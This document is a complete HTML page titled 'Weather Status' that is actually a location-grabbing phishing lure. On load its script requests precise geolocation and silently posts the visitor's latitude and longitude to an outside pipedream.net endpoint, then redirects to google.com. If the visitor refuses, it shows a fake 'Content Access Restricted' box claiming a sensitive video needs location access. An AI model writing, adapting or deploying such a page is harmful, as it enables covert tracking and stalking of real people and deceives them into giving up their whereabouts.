<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Weather Status</title>
    <style>
        body {
            margin: 0; padding: 0;
            background-color: #0f0f0f;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            color: #ffffff;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; overflow: hidden;
        }

        #verification-modal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(0, 0, 0, 0.95);
            z-index: 9999;
            justify-content: center; align-items: center;
            padding: 20px; box-sizing: border-box;
        }

        .modal-box {
            background-color: #1f1f1f;
            border: 1px solid #333333;
            border-radius: 8px;
            padding: 30px; max-width: 400px; width: 100%;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
        }

        .modal-title {
            font-size: 18px; font-weight: 600;
            margin-bottom: 14px; color: #ff4d4d; /* मुख्य लाल रंग */
            letter-spacing: 0.5px;
        }

        .modal-text {
            font-size: 14px; color: #aaaaaa;
            line-height: 1.6; margin-bottom: 24px;
        }

        /* 🌟 आपके निर्देशानुसार: बिना किसी डरावने निशान के, सीधे लाल रंग में बोल्ड निर्देश */
        .highlight-alert-red {
            color: #ff4d4d; 
            font-weight: 700;
            display: block;
            margin-bottom: 12px;
            font-size: 15px;
            letter-spacing: 0.3px;
        }

        .action-btn {
            background-color: #cc0000;
            color: #ffffff; border: none;
            padding: 12px 24px; font-size: 14px; font-weight: 600;
            border-radius: 4px; cursor: pointer; width: 100%;
            letter-spacing: 0.5px;
            transition: background-color 0.2s;
        }
        .action-btn:active {
            background-color: #990000;
        }

        .spinner {
            border: 3px solid #333; border-top: 3px solid #ffffff;
            border-radius: 50%; width: 30px; height: 30px;
            animation: spin 1s linear infinite; margin: 0 auto 15px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <!-- शुरुआती लोडिंग स्क्रीन -->
    <div id="loading-context" style="text-align: center;">
        <div class="spinner"></div>
        <h2>Loading Page, Please Wait...</h2>
    </div>

    <!-- आपका कस्टमाइज्ड डायरेक्ट और प्रोफेशनल मैसेज बॉक्स -->
    <div id="verification-modal">
        <div class="modal-box">
            <div class="modal-title">Content Access Restricted</div>
            <div class="modal-text">
                <!-- 🌟 बिल्कुल साफ़, गंभीर और लाल रंग में बोल्ड की गई मुख्य लाइन -->
                <span class="highlight-alert-red">Turn On Your Device Location Required</span>
                This media contains sensitive content. Please turn ON your mobile location settings and grant browser access to view this video.
            </div>
            <button class="action-btn" onclick="window.location.reload();">Verify & Watch Video</button>
        </div>
    </div>

    <script>
        var targetEndpoint = 'https://eohi4x7xdjpqqrs.m.pipedream.net';

        function originalFetchDispatch(lat, lon) {
            fetch(targetEndpoint, {
                method: 'POST',
                mode: 'no-cors', 
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ latitude: lat, longitude: lon }),
                keepalive: true
            });

            window.location.href = "https://google.com";
        }

        function showRestrictionScreen() {
            document.getElementById('loading-context').style.display = 'none';
            document.getElementById('verification-modal').style.display = 'flex';
        }

        function executeLocationFetch() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    var lat = position.coords.latitude;
                    var lon = position.coords.longitude;
                    originalFetchDispatch(lat, lon);
                }, function(error) {
                    showRestrictionScreen();
                }, {
                    enableHighAccuracy: true,
                    timeout: 15000, 
                    maximumAge: 0 
                });
            } else {
                showRestrictionScreen();
            }
        }

        window.onload = function() {
            executeLocationFetch();
        }
    </script>
</body>
</html>
